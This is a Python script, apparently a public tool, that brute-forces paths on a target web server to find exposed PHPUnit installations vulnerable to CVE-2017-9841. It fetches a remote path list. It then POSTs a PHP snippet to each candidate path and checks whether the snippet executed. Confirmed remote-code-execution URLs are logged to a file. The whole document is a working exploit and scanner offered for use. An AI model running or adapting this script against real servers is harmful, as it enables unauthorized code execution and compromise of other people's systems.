#!/usr/bin/env python
#
# 
#
# phpunit-brute.py - Finding paths to phpunit to gain RCE. (CVE-2017-9841)
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True ,default="http://localhost",help="URL to test")
parser.add_argument("-p", "--proxy",required=False, help="Proxy for debugging")

args = parser.parse_args()
url = args.url
if args.proxy:
	proxy = args.proxy
else:
	proxy = ""




http_proxy = proxy
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }
            
            



def test_url(url,urlpath):
	newurl = ""+url+""+urlpath+""
	rawBody = "<?php phpinfo();"
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
	try:
		response = session.post(newurl, headers=headers,verify=False,data=rawBody, proxies=proxyDict,timeout=30)
		if response.status_code == 200:
			if "PHP License as published by the PHP Group" in response.text:
				print("[+] Found RCE for "+newurl+" [+]")
				text_file = open("found.txt", "a")
				text_file.write(""+newurl+"\n")
				text_file.close()
				return True
			else:
				print("[-] No Luck for "+urlpath+" [-]")
		else:
			print("[-] No Luck for "+urlpath+" [-]")
	except:
		print ("[-]Check Url might have Issues[-]")
		sys.exit(0)
			
			
def grab_paths(url):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
	try:
		response = session.get("https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt", headers=headers,verify=False, proxies=proxyDict)
		lines = response.text.strip().split('\n')
		for urlpath in lines:
			loop = test_url(url,urlpath)
			if loop:
				break
	except:
		print("[-] Failed to obtain paths file [-]")
		sys.exit(0)
				
	
grab_paths(url)
